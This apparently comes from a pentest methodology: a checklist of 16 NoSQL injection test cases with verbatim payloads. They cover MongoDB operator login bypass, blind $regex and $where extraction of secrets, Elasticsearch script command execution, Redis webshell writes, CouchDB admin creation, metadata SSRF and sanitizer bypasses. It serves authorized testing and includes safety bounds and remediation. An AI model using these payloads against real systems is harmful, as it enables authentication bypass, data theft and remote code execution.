# NoSQL Injection — Checklist

Expert per-attack **test-case matrix** for NoSQL Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*16 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## NOSQL-001 — Fingerprint datastore, driver &amp; body-parser behavior
**Test Category:** Recon &amp; Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Login, search, filter, id, sort, aggregation, JSON bodies

**Test Steps:** 1. Identify the datastore (MongoDB/CouchDB/Elasticsearch/Redis/Neo4j/DynamoDB/Firebase) and stack/driver (Node+Mongoose / PyMongo / PHP).<br>2. Determine body-parser behavior: does p[$ne]= become an object? Is JSON accepted?<br>3. Map ALL query-reaching inputs (login, search, filter, id, sort, aggregation, JSON bodies).

**Expected Result:** The datastore, driver, parser behavior, and injectable inputs are known.

**Payload Example:**

```
p[$ne]=x becomes {p:{$ne:'x'}} ; JSON body accepted ; Mongoose detected
```

**Impact:** Whether brackets parse into operators decides if NoSQLi is even reachable.

**Tools:** Burp Suite Pro, httpx

**References:** CWE-943; OWASP Testing Guide: Testing for NoSQL Injection (WSTG-INPV-05)

---

## NOSQL-002 — Operator differential detection (TRUE vs FALSE control)
**Test Category:** Detection · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Any query-reaching parameter

**Test Steps:** 1. Send a TRUE-forcing operator: param[$ne]=nonexistent / [$regex]=.* / [$gt]= (expect more/all/login-ok).<br>2. Send the FALSE control: param[$gt]=zzzz / [$regex]=^$ (expect none).<br>3. A response DIFF between TRUE and FALSE = injectable operator. Try BOTH JSON body and bracket/form forms.

**Expected Result:** TRUE and FALSE operator payloads produce a stable, repeatable response difference.

**Payload Example:**

```
param[$ne]=x  vs  param[$regex]=^$  ;  {"param":{"$gt":""}}
```

**Impact:** Confirms the query interprets attacker operators - the core NoSQLi primitive.

**Tools:** Burp Repeater/Intruder, poc/nosqli_fuzz.py

**References:** CWE-943; PortSwigger Web Security Academy: NoSQL injection

---

## NOSQL-003 — Time-based blind detection ($where sleep)
**Test Category:** Detection · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Inputs reaching a $where JS predicate

**Test Steps:** 1. Inject a bounded delay: {"$where":"sleep(3000)"} (&lt;=5s).<br>2. Confirm a REPEATABLE delay vs a no-payload baseline.<br>3. Boolean-via-time: {"$where":"this.user=='admin' &amp;&amp; sleep(3000)"}.

**Expected Result:** The response is reliably delayed only when the $where payload is present.

**Payload Example:**

```
{"$where":"sleep(3000)"} ; {"$where":"this.user=='admin' && sleep(3000)"}
```

**Impact:** Proves server-side JS execution / a blind oracle even with no reflected output.

**Tools:** Burp Repeater

**References:** CWE-943; HackTricks: NoSQL injection

---

## NOSQL-004 — Authentication bypass via operators (JSON)
**Test Category:** Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoints accepting JSON

**Test Steps:** 1. Send {"username":{"$ne":null},"password":{"$ne":null}} - matches any user.<br>2. Target admin: {"username":"admin","password":{"$ne":"x"}} or {"password":{"$regex":"^"}}.<br>3. $in list: {"username":{"$in":["admin","root"]},"password":{"$ne":1}}.<br>4. CONFIRM: logged in with NO valid password, fresh session, as the expected/admin user.

**Expected Result:** You are authenticated without a valid password, as the intended/admin user.

**Payload Example:**

```
{"username":{"$ne":null},"password":{"$ne":null}} ; {"username":"admin","password":{"$ne":"x"}}
```

**Impact:** Full authentication bypass / admin login - Critical.

**Tools:** Burp Repeater

**References:** CWE-943; CWE-287; PortSwigger Web Security Academy: NoSQL injection

---

## NOSQL-005 — Authentication bypass via operators (form/bracket)
**Test Category:** Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoints accepting urlencoded/form bodies

**Test Steps:** 1. username[$ne]=x&amp;password[$ne]=x.<br>2. username=admin&amp;password[$ne]=x ; username[$regex]=.*&amp;password[$regex]=.*.<br>3. Confirm the same no-password login as above.

**Expected Result:** Bracket-operator form data authenticates you without a password.

**Payload Example:**

```
username[$ne]=x&password[$ne]=x ; username=admin&password[$regex]=^
```

**Impact:** Auth bypass via the form-encoded operator form - Critical.

**Tools:** Burp Repeater

**References:** CWE-943; CWE-287; PayloadsAllTheThings/NoSQL Injection

---

## NOSQL-006 — $where string-concatenation login bypass
**Test Category:** Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Logins that build a $where JS string from input

**Test Steps:** 1. Break out of the JS string: username=admin'||'1'=='1 ; admin'||1==1//.<br>2. password=' || true || '.<br>3. Confirm login as admin.

**Expected Result:** The injected JS boolean forces the $where predicate true and logs you in.

**Payload Example:**

```
admin'||'1'=='1 ; admin'||1==1// ; ' || true || '
```

**Impact:** Auth bypass via $where string injection - Critical.

**Tools:** Burp Repeater

**References:** CWE-943; CWE-287; HackTricks: NoSQL injection

---

## NOSQL-007 — Filter/query data disclosure
**Test Category:** Data Disclosure · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Search/filter/id/sort parameters

**Test Steps:** 1. [$ne]/$regex=.* on a filter param to reveal other users'/unpublished data - but diff against a FALSE control (an endpoint that returns all by default is not a finding).<br>2. _id/lookup type confusion.<br>3. Confirm you see data you should not.

**Expected Result:** The filter operator returns records outside your authorized scope (vs the false control).

**Payload Example:**

```
status[$ne]=deleted ; owner[$regex]=.* ; _id[$gt]=
```

**Impact:** Cross-user / unpublished data disclosure - High.

**Tools:** Burp Repeater

**References:** CWE-943; PortSwigger Web Security Academy: NoSQL injection

---

## NOSQL-008 — Aggregation abuse ($lookup / $out / $merge)
**Test Category:** Data Disclosure / Write · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Endpoints exposing an aggregation pipeline

**Test Steps:** 1. $lookup to read across collections: {"$lookup":{"from":"users",...}}.<br>2. $out/$merge WRITE a new collection (integrity) - avoid on prod.<br>3. $function (MongoDB 4.4+) for JS execution.

**Expected Result:** The pipeline reads another collection or writes data you control.

**Payload Example:**

```
{"pipeline":[{"$lookup":{"from":"users","localField":"x","foreignField":"y","as":"z"}}]}
```

**Impact:** Cross-collection read / arbitrary write via aggregation - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-943; HackTricks: NoSQL injection

---

## NOSQL-009 — Blind extraction via $regex (char-by-char) -&gt; ATO
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** A boolean oracle (login-ok / result-count / status / length)

**Test Steps:** 1. Establish the oracle, then extract char by char: password[$regex]=^a, ^ab, ^abc.<br>2. Discover length with ^.{N}$.<br>3. Extract a SECRET from your OWN account (hash/token) or a password-RESET token -&gt; account takeover. Escape regex metachars in the known prefix.

**Expected Result:** The regex oracle reveals a secret character by character.

**Payload Example:**

```
{"username":"admin","password":{"$regex":"^abc"}} ; {"...":{"$regex":"^.{32}$"}}
```

**Impact:** Blind extraction of reset tokens/hashes -&gt; account takeover - High/Critical.

**Tools:** poc/nosqli_blind.py, Burp Intruder

**References:** CWE-943; PortSwigger Web Security Academy: NoSQL injection

---

## NOSQL-010 — Blind extraction via $where JS (regex filtered)
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** $where reachable when $regex is filtered

**Test Steps:** 1. {"$where":"this.password[0]=='a'"} ; charCodeAt binary search.<br>2. {"$where":"this.password.match(/^a/)!=null"}.<br>3. Field discovery: {"$where":"Object.keys(this)"}. Bounded sleeps only.

**Expected Result:** The $where JS oracle extracts secret bytes / discovers fields.

**Payload Example:**

```
{"$where":"this.password.charCodeAt(0)>96"} ; {"$where":"Object.keys(this)"}
```

**Impact:** Blind data extraction via server-side JS - High/Critical.

**Tools:** poc/nosqli_blind.py

**References:** CWE-943; HackTricks: NoSQL injection

---

## NOSQL-011 — Server-side JS execution ($where / $function / mapReduce)
**Test Category:** Server-Side JS · **Severity:** High · **CVSS:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)

**Where to Test / Injection Point:** MongoDB with JS enabled

**Test Steps:** 1. Confirm JS runs: $where predicate, $function (4.4+), mapReduce.<br>2. {"$function":{"body":"function(){return true}","args":[],"lang":"js"}}.<br>3. This is a strong DoS/logic primitive; bounded only on prod.

**Expected Result:** Server-side JavaScript you supply executes inside the query engine.

**Payload Example:**

```
{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}
```

**Impact:** Server-side JS execution -&gt; blind exfil / logic bypass / DoS - High.

**Tools:** Burp Repeater, mongosh

**References:** CWE-943; HackTricks: NoSQL injection

---

## NOSQL-012 — Elasticsearch scripting RCE / dump
**Test Category:** Per-Datastore — Elasticsearch · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Elasticsearch query/script endpoints

**Test Steps:** 1. Search injection: GET /_search?q=* ; _all dump.<br>2. Scripting RCE: {"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}} (CVE-2014-3120/2015-1427 class). Benign command only.

**Expected Result:** The script field executes a benign command / the index is dumped.

**Payload Example:**

```
POST /_search {"script_fields":{"x":{"script":"...exec('id')"}}}
```

**Impact:** RCE / full-index disclosure via Elasticsearch - Critical.

**Tools:** Burp Repeater

**References:** CWE-943; CWE-94; Elasticsearch CVE-2015-1427; HackTricks: NoSQL injection

---

## NOSQL-013 — Redis / Neo4j / CouchDB / Firebase datastore attacks
**Test Category:** Per-Datastore · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Redis (via SSRF/CRLF), Neo4j Cypher, CouchDB, Firebase REST

**Test Steps:** 1. Redis via SSRF/CRLF: CONFIG SET dir/dbfilename + SET webshell + SAVE ; EVAL Lua ; MODULE LOAD.<br>2. Neo4j: LOAD CSV FROM 'http://169.254.169.254/...' (SSRF); CALL apoc.load.json.<br>3. CouchDB CVE-2017-12635 admin creation (duplicate-key roles). Firebase: unauth read/write on open rules (/users.json).

**Expected Result:** The datastore-specific injection yields webshell / SSRF / admin / unauth data.

**Payload Example:**

```
PUT /_users/org.couchdb.user:hacker {roles:['_admin'],roles:[]} ; GET TARGET.firebaseio.com/users.json
```

**Impact:** RCE / SSRF-&gt;metadata / privilege escalation / unauth data - Critical.

**Tools:** Burp Repeater, SSRFmap

**References:** CWE-943; CouchDB CVE-2017-12635; HackTricks: NoSQL injection

---

## NOSQL-014 — WAF / sanitizer bypass
**Test Category:** Evade — WAF/Sanitizer · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** express-mongo-sanitize / $-stripping sanitizers

**Test Steps:** 1. Nest deeper past key-stripping: {"username":{"$not":{"$eq":null}}}.<br>2. Content-type switch (JSON &lt;-&gt; form username[$ne]= &lt;-&gt; multipart).<br>3. HPP (username=admin&amp;username[$ne]=x), type juggling (password=0), array injection (username[]=admin), second-order (stored operator used later).

**Expected Result:** The operator survives the sanitizer via nesting/encoding/type tricks.

**Payload Example:**

```
{"username":{"$not":{"$eq":null}}} ; username=admin&username[$ne]=x ; username[]=admin
```

**Impact:** Restores NoSQLi against sanitizers - proves partial fixes incomplete. Bypass.

**Tools:** Burp Repeater

**References:** CWE-943; HackTricks: NoSQL injection

---

## NOSQL-015 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: a lone 500/error from [$ne] or { (no steered behavior change); $regex=.* returning all when the endpoint returns all by default (no diff vs false control); a single non-repeatable timing blip; a reflected operator in a JSON echo (no query effect); 'it's MongoDB' with no injecting parameter.<br>2. REQUIRE: a steered, repeatable change (login without password / data out / secret extracted / JS executed).

**Expected Result:** Only candidates with a steered, repeatable, control-baselined change survive.

**Payload Example:**

```
lone 500 = not a finding ; $regex=.* = only if it diffs the false control ; reflected operator = no query effect
```

**Impact:** Protects credibility; NoSQLi is dense with 'a 500 from a brace' false positives.

**Tools:** manual

**References:** CWE-943; PortSwigger Web Security Academy: NoSQL injection

---

## NOSQL-016 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact: auth bypass / data exfil / secret-&gt;ATO / RCE.<br>2. Provide the payload, the TRUE-vs-FALSE control responses, and the concrete proof (logged-in session / extracted secret / benign command output).<br>3. Set CVSS 3.1 + CWE-943. Remediation: cast inputs to strings/expected types, reject objects where scalars are expected, use parameterized queries, disable $where/server-side JS, least-privilege DB user, validate content-type.<br>4. Own test account as victim, bounded sleeps, stop extraction once proven, delete throwaway writes; de-dupe.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: payload + true/false control diff + concrete impact proof + CVSS + CWE-943 + remediation.
```

**Impact:** Converts the steered change into a defensible Critical/High report at the right severity.

**Tools:** CVSS calculator, NOSQLI_REPORT_TEMPLATE.md

**References:** CWE-943; FIRST CVSS v3.1; OWASP Testing Guide: Testing for NoSQL Injection (WSTG-INPV-05)  |  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; OWASP; Charlie Belmer nosqli research

---
